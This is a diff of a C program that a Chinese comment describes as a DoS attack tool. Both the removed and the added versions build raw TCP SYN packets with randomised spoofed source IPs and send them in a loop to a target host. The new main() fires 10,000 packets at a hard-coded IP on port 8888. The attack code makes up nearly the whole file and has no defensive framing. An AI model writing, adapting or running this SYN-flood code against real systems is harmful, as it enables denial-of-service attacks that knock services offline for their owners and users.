@@ -1,164 +1,130 @@
-#include <stdio.h>
-#include <netinet/in.h>
-#include <netdb.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <signal.h>
-#include <errno.h>
+/**
+ * 用来攻进行dos攻击
+ */
+#include <stdio.h> 
+#include <sys/types.h> 
+#include <sys/socket.h> 
+#include <netdb.h> 
+#include <unistd.h> 
+#include <stdlib.h> 
+#include <netinet/ip.h> 
+#include <netinet/tcp.h> 
+#include <errno.h> 
+#include <string.h> 
+#include <sys/socket.h> 
+#include <netinet/in.h> 
+#include <arpa/inet.h> 
 
-typedef struct ip_hdr {
-    unsigned char h_verlen;
-    unsigned char tos;
-    unsigned short total_len;
-    unsigned short ident;
-    unsigned short frag_and_flags;
-    unsigned char ttl;
-    unsigned char proto;
-    unsigned short checksum;
-    unsigned int sourceIP;
-    unsigned int destIP;
-} IP_HEADER;
+struct pseudohdr {
+    struct in_addr saddr;
+    struct in_addr daddr;
+    u_char zero;
+    u_char protocol;
+    u_short length;
+    struct tcphdr tcpheader;
+};
 
-typedef struct tcp_hdr {
-    unsigned short th_sport;
-    unsigned short th_dport;
-    unsigned int th_seq;
-    unsigned int th_ack;
-    unsigned char th_lenres;
-    unsigned char th_flag;
-    unsigned short th_win;
-    unsigned short th_sum;
-    unsigned short th_urp;
-} TCP_HEADER;
-
-typedef struct tsd_hdr {
-    unsigned long saddr;
-    unsigned long daddr;
-    char mbz;
-    char ptcl;
-    unsigned short tcpl;
-} PSD_HEADER;
-
-#define PACKET_SIZE     (sizeof(IP_HEADER) + sizeof( TCP_HEADER ))
-#define TH_SYN (0x02)
-
-unsigned short CheckSum(unsigned short * buffer, int size) {
-    unsigned long cksum = 0;
-    while (size > 1) {
-        cksum += *buffer++;
-        size -= sizeof (unsigned short);
+u_short checksum(u_short * data, u_short length) {
+    int nleft = length;
+    int sum = 0;
+    unsigned short *w = data;
+    unsigned short value = 0;
+    while (nleft > 1) {
+        sum += *w++;
+        nleft -= 2;
     }
-    if (size) {
-        cksum += *(unsigned char *) buffer;
+    if (nleft == 1) {
+        *(unsigned char *) (&value) = *(unsigned char *) w;
+        sum += value;
     }
-    cksum = (cksum >> 16) + (cksum & 0xffff);
-    cksum += (cksum >> 16);
-    return (unsigned short) (~cksum);
-}
-
-void MySleep(unsigned int micro_second) {
-    struct timeval t_timeval;
-    t_timeval.tv_sec = 0;
-    t_timeval.tv_usec = micro_second;
-    select(0, NULL, NULL, NULL, &t_timeval);
-}
-
-void Init(char* buffer, char* dst_ip, uint16_t dst_port) {
-    char src_ip[20] = {0};
-    IP_HEADER IpHeader;
-    TCP_HEADER TcpHeader;
-    PSD_HEADER PsdHeader;
-    sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
-    IpHeader.h_verlen = (4 << 4 | sizeof (IpHeader) / sizeof (unsigned int));
-    IpHeader.tos = 0;
-    IpHeader.total_len = htons(sizeof (IpHeader) + sizeof (TcpHeader));
-    IpHeader.ident = 1;
-    IpHeader.frag_and_flags = 0x40;
-    IpHeader.ttl = 255;
-    IpHeader.proto = IPPROTO_TCP;
-    IpHeader.checksum = 0;
-    IpHeader.sourceIP = inet_addr(src_ip);
-    IpHeader.destIP = inet_addr(dst_ip);
-
-    TcpHeader.th_sport = htons(rand() % 9000 + 1234);
-    TcpHeader.th_dport = htons(dst_port);
-    TcpHeader.th_seq = htonl(rand() % 90000000 + 2345);
-    TcpHeader.th_ack = 0;
-    TcpHeader.th_lenres = (sizeof (TcpHeader) / 4 << 4 | 0);
-    TcpHeader.th_flag = TH_SYN;
-    TcpHeader.th_win = htons(512);
-    TcpHeader.th_sum = 0;
-    TcpHeader.th_urp = 0;
-
-    PsdHeader.saddr = IpHeader.sourceIP;
-    PsdHeader.daddr = IpHeader.destIP;
-    PsdHeader.mbz = 0;
-    PsdHeader.ptcl = IPPROTO_TCP;
-    PsdHeader.tcpl = htons(sizeof (TcpHeader));
-
-    memcpy((void*) buffer, (void*) &PsdHeader, sizeof (PsdHeader));
-    memcpy((void*) (buffer + sizeof (PsdHeader)), (void*) &TcpHeader, sizeof (TcpHeader));
-    TcpHeader.th_sum = CheckSum((unsigned short *) buffer, sizeof (PsdHeader) + sizeof (TcpHeader));
-
-    memset(buffer, 0, PACKET_SIZE);
-    memcpy((void*) buffer, (void*) &IpHeader, sizeof (IpHeader));
-    IpHeader.checksum = CheckSum((unsigned short *) buffer, sizeof (IpHeader));
-
-    //memcpy( (void*)buffer, (void*)&IpHeader, sizeof(IpHeader) );
-    memcpy((void*) (buffer + sizeof (IpHeader)), (void*) &TcpHeader, sizeof (TcpHeader));
+    sum = (sum >> 16)+(sum & 0xffff);
+    sum += (sum >> 16);
+    value = ~sum;
+    return value;
 }
 
 /**
- * syn dos
+ * 欺骗
  * @param serverip
- * @param dst_port
- * @param times
+ * @param serverport
+ * @param localport
  * @return 
  */
-int spoof(char* serverip, uint16_t dst_port, uint32_t times) {
-    char dst_ip[20] = {0};
-    strncpy(dst_ip, serverip, 16);
-    if (inet_addr(dst_ip) == INADDR_NONE) {
-        printf("ip error.\n");
+int spoof(char* serverip, int serverport, int times) {
+    unsigned long srcport;
+    struct sockaddr_in sin; //服务器地址
+    struct sockaddr_in din; //本机
+    struct hostent* hoste; //服务器地址
+    struct hostent* host1; //本机
+    int j, sock, foo;
+    char buffer[40];
+    struct ip* ipheader = (struct ip*) buffer;
+    struct tcphdr * tcpheader = (struct tcphdr*) (buffer + sizeof (struct ip));
+    struct pseudohdr pseudoheader;
+    bzero(&sin, sizeof (struct sockaddr_in));
+    sin.sin_family = AF_INET;
+    char src_ip[20] = {0};
+    sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
+    host1 = gethostbyname(src_ip);
+    bcopy(host1->h_addr, &din.sin_addr, host1->h_length);
+    hoste = gethostbyname(serverip);
+    bcopy(hoste->h_addr, &sin.sin_addr, hoste->h_length);
+    sin.sin_port = htons(serverport);
+    if ((sock = socket(AF_INET, SOCK_RAW, 255)) == -1) {
+        fprintf(stderr, "couldn't   allocate   raw   socket!\n");
         return -1;
     }
-    if (dst_port < 0 || dst_port > 65535) {
-        printf("port error.\n");
+    foo = 1;
+    if (setsockopt(sock, 0, IP_HDRINCL, (char *) &foo, sizeof (int)) == -1) {
+        fprintf(stderr, "couldn't   set   raw   header   on   socket   \n");
         return -1;
     }
-    int sock;
-    int flag = 1;
-    char buffer[PACKET_SIZE] = {0};
-    struct sockaddr_in sa;
-    memset(&sa, 0, sizeof (struct sockaddr_in));
-    sa.sin_family = AF_INET;
-    sa.sin_port = htons(dst_port);
-    sa.sin_addr.s_addr = inet_addr(dst_ip);
-    if ((sock = socket(PF_INET, SOCK_RAW, 6)) < 1) {
-        printf("create socket error.%s\n", strerror(errno));
-        exit(-1);
-    }
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &flag, sizeof (flag)) < 0) {
-        printf("setsockopt error.%d\n", errno);
-        exit(-1);
-    }
-    srand((unsigned) time(NULL)); //当前时间做种
-    while (times--) {
-        memset((void*) buffer, 0, PACKET_SIZE);
-        Init(buffer, dst_ip, dst_port);
-        if (sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *) (&sa), sizeof (struct sockaddr_in)) < 0) {
+    for (j = 0; j < times; j++) {
+        char src_ip[20] = {0};
+        sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
+        host1 = gethostbyname(src_ip);
+        bcopy(host1->h_addr, &din.sin_addr, host1->h_length);
+        bzero(&buffer, sizeof (struct ip) + sizeof (struct tcphdr));
+        ipheader->ip_v = 4;
+        ipheader->ip_tos = 0;
+        ipheader->ip_hl = sizeof (struct ip) / 4;
+        ipheader->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
+        ipheader->ip_id = htons(random());
+        ipheader->ip_ttl = 30; /*255*/
+        ipheader->ip_p = IPPROTO_TCP;
+        ipheader->ip_sum = 0;
+        ipheader->ip_src = din.sin_addr;
+        ipheader->ip_dst = sin.sin_addr;
+
+        srcport = random() % 15000 + 10000;
+        tcpheader->th_sport = htons(srcport); /*sin.sin_port*/
+        tcpheader->th_dport = sin.sin_port;
+        tcpheader->th_seq = htonl(0x28374839);
+        tcpheader->th_flags = TH_SYN;
+        tcpheader->th_off = sizeof (struct tcphdr) / 4;
+        tcpheader->th_win = htons(2048);
+        tcpheader->th_sum = 0;
+
+        bzero(&pseudoheader, 12 + sizeof (struct tcphdr));
+        pseudoheader.saddr.s_addr = din.sin_addr.s_addr;
+        pseudoheader.daddr.s_addr = sin.sin_addr.s_addr;
+        pseudoheader.protocol = 6;
+        pseudoheader.length = htons(sizeof (struct tcphdr));
+        tcpheader->th_sum = checksum((u_short *) & pseudoheader, 12 + sizeof (struct tcphdr));
+        ssize_t c = sendto(sock, buffer, sizeof (struct ip) + sizeof (struct tcphdr), 0, (struct sockaddr *) &sin, sizeof (struct sockaddr_in));
+        if (c <= 0) {
             fprintf(stderr, "couldn't   send   packet  %d \n", errno);
+            return -1;
         } else {
             fprintf(stdout, ".");
             fflush(stdout);
         }
     }
+    close(sock);
+    return 1;
 }
 
-//int main(int argc, char *argv[]) {
-//    spoof("192.168.10.151", 8888, 20000);
-//   // fprintf(stdout,"%d",sizeof(long));
-//    return 0;
-//}
+int main(int argc, char * argv[]) {
+    spoof("1.168.10.151", 8888, 10000);
+    return 0;
+}
